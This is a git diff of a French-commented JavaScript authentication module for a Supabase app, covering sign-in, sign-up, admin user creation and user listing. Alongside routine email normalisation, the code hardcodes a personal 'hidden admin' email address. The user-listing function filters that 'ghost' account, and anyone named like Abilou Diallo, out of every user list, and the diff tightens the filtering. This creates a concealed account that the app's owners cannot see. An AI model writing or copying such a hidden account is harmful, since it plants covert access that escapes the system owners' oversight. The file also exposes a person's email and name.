@@ -12,7 +12,7 @@ export const ROLE_LABELS = {
   owner: 'Propriétaire',
 }
 
-// Email de maintenance à masquer TOTALEMENT
+// CONFIGURATION DU COMPTE DE MAINTENANCE À MASQUER
 export const HIDDEN_ADMIN_EMAIL = 'njoyadiallo4@gmail.com'
 
 function createTempClient() {
@@ -41,13 +41,13 @@ export function onAuthChange(callback) {
 
 export async function signIn(email, password) {
   if (!isSupabaseConfigured) return { error: { message: 'Configuration absente.' } }
-  return supabase.auth.signInWithPassword({ email: email.trim(), password })
+  return supabase.auth.signInWithPassword({ email: email.trim().toLowerCase(), password })
 }
 
 export async function signUp(email, password, fullName = '', role = 'student', phone = '') {
-  if (!isSupabaseConfigured) return { error: { message: 'Configuration Supabase absente.' } }
+  if (!isSupabaseConfigured) return { error: { message: 'Configuration absente.' } }
   return supabase.auth.signUp({
-    email: email.trim(),
+    email: email.trim().toLowerCase(),
     password,
     options: { data: { full_name: fullName, role, phone } },
   })
@@ -59,11 +59,13 @@ export async function adminCreateUser(payload) {
   }
   const tempClient = createTempClient()
   const { data, error } = await tempClient.auth.signUp({
-    email: payload.email.trim(),
+    email: payload.email.trim().toLowerCase(),
     password: payload.password,
     options: { data: { full_name: payload.full_name, role: payload.role, phone: payload.phone || '' } },
   })
   if (error) throw error
+  if (!data.user) throw new Error("Échec de création")
+
   const { data: profile } = await supabase.from('profiles').update({ phone: payload.phone }).eq('id', data.user.id).select().single()
   return profile || data.user
 }
@@ -83,7 +85,7 @@ export async function getProfile(userId) {
 }
 
 /**
- * Récupère les utilisateurs filtrés.
+ * Récupère les utilisateurs et applique un filtrage strict pour le compte de maintenance
  */
 export async function getUsers(options = {}) {
   if (!isSupabaseConfigured) return []
@@ -95,13 +97,14 @@ export async function getUsers(options = {}) {
       rawUsers = fallback || []
     }
 
-    const target = HIDDEN_ADMIN_EMAIL.toLowerCase().trim()
+    const ghostEmail = HIDDEN_ADMIN_EMAIL.toLowerCase().trim()
 
-    // Filtrage extrêmement strict : email exact OU contient l'identifiant OU nom spécifique
+    // Filtrage robuste (Email + Nom Abilou Diallo)
     let filtered = rawUsers.filter(u => {
-      const uEmail = (u.email || '').toLowerCase().trim();
-      const uName = (u.full_name || '').toLowerCase().trim();
-      return uEmail !== target && !uEmail.includes('njoyadiallo4') && uName !== 'abilou diallo';
+      const email = (u.email || '').toLowerCase().trim()
+      const name = (u.full_name || '').toLowerCase()
+      const isGhost = email === ghostEmail || email.includes('njoyadiallo4') || (name.includes('abilou') && name.includes('diallo'))
+      return !isGhost
     })
 
     if (options.hideOwner) filtered = filtered.filter(u => u.role !== 'owner')
